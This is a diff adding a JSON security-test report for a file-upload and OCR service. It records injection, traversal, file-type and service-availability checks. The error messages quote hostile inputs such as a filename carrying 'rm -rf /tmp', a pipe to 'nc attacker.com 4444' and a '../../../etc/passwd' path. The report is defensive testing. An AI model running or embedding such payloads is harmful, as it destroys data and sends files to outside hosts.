@@ -1,0 +1,131 @@
+{
+  "summary": {
+    "totalTests": 17,
+    "passed": 4,
+    "failed": 13,
+    "blocked": 0,
+    "securityScore": 24,
+    "timestamp": "2025-05-26T18:45:01.923Z"
+  },
+  "tests": [
+    {
+      "name": "Filename Command Injection",
+      "severity": "CRITICAL",
+      "status": "FAILED",
+      "message": "Unexpected error: Secure command execution failed: Argument 0 contains dangerous characters: test\"; rm -rf /tmp; echo \"pwned",
+      "timestamp": "2025-05-26T18:45:01.904Z"
+    },
+    {
+      "name": "Path Traversal Attack",
+      "severity": "CRITICAL",
+      "status": "FAILED",
+      "message": "Unexpected error: Secure command execution failed: Argument 0 contains dangerous characters: ../../../etc/passwd",
+      "timestamp": "2025-05-26T18:45:01.905Z"
+    },
+    {
+      "name": "Shell Metacharacters",
+      "severity": "CRITICAL",
+      "status": "FAILED",
+      "message": "Unexpected error: Secure command execution failed: Argument 0 contains dangerous characters: test.jpg && cat /etc/hosts",
+      "timestamp": "2025-05-26T18:45:01.905Z"
+    },
+    {
+      "name": "Pipe Command Injection",
+      "severity": "CRITICAL",
+      "status": "FAILED",
+      "message": "Unexpected error: Secure command execution failed: Argument 0 contains dangerous characters: test.jpg | nc attacker.com 4444",
+      "timestamp": "2025-05-26T18:45:01.905Z"
+    },
+    {
+      "name": "Backtick Command Substitution",
+      "severity": "CRITICAL",
+      "status": "FAILED",
+      "message": "Unexpected error: Secure command execution failed: Argument 0 contains dangerous characters: test`whoami`.jpg",
+      "timestamp": "2025-05-26T18:45:01.905Z"
+    },
+    {
+      "name": "Invalid MIME Type",
+      "severity": "HIGH",
+      "status": "FAILED",
+      "message": "Unexpected error: File validation failed: Invalid file type: application/x-executable. Allowed types: image/jpeg, image/jpg, image/png, image/gif, image/bmp, image/tiff, image/webp",
+      "timestamp": "2025-05-26T18:45:01.911Z"
+    },
+    {
+      "name": "Executable File Upload",
+      "severity": "HIGH",
+      "status": "FAILED",
+      "message": "Unexpected error: File validation failed: File content doesn't match claimed type image/jpeg",
+      "timestamp": "2025-05-26T18:45:01.911Z"
+    },
+    {
+      "name": "Zero-byte File",
+      "severity": "MEDIUM",
+      "status": "FAILED",
+      "message": "Unexpected error: File validation failed: File content doesn't match claimed type image/jpeg",
+      "timestamp": "2025-05-26T18:45:01.911Z"
+    },
+    {
+      "name": "Oversized File",
+      "severity": "MEDIUM",
+      "status": "FAILED",
+      "message": "Unexpected error: File validation failed: File too large: 104857600 bytes. Maximum allowed: 10485760 bytes",
+      "timestamp": "2025-05-26T18:45:01.917Z"
+    },
+    {
+      "name": "Directory Traversal",
+      "severity": "CRITICAL",
+      "status": "FAILED",
+      "message": "Unexpected error: Invalid file path for OCR processing",
+      "timestamp": "2025-05-26T18:45:01.917Z"
+    },
+    {
+      "name": "Absolute Path Outside Upload Dir",
+      "severity": "CRITICAL",
+      "status": "FAILED",
+      "message": "Unexpected error: Invalid file path for OCR processing",
+      "timestamp": "2025-05-26T18:45:01.917Z"
+    },
+    {
+      "name": "Symlink Attack",
+      "severity": "HIGH",
+      "status": "FAILED",
+      "message": "Unexpected error: Invalid file path for OCR processing",
+      "timestamp": "2025-05-26T18:45:01.917Z"
+    },
+    {
+      "name": "Secure Command Service Available",
+      "severity": "CRITICAL",
+      "status": "PASSED",
+      "message": "Service loaded successfully",
+      "timestamp": "2025-05-26T18:45:01.918Z"
+    },
+    {
+      "name": "Secure File Upload Service Available",
+      "severity": "CRITICAL",
+      "status": "PASSED",
+      "message": "Service loaded successfully",
+      "timestamp": "2025-05-26T18:45:01.918Z"
+    },
+    {
+      "name": "Secure Enhanced OCR Service Available",
+      "severity": "CRITICAL",
+      "status": "FAILED",
+      "message": "Service import failed: Cannot find module '@prisma/client'\nRequire stack:\n- /workspaces/ai-sports-edge-restore/services/secureEnhancedOCRService.js\n- /workspaces/ai-sports-edge-restore/scripts/validate-ocr-security.js",
+      "timestamp": "2025-05-26T18:45:01.920Z"
+    },
+    {
+      "name": "Secure Multi-Provider OCR Service Available",
+      "severity": "HIGH",
+      "status": "PASSED",
+      "message": "Service loaded successfully",
+      "timestamp": "2025-05-26T18:45:01.921Z"
+    },
+    {
+      "name": "Secure Image Preprocessing Service Available",
+      "severity": "HIGH",
+      "status": "PASSED",
+      "message": "Service loaded successfully",
+      "timestamp": "2025-05-26T18:45:01.922Z"
+    }
+  ]
+}
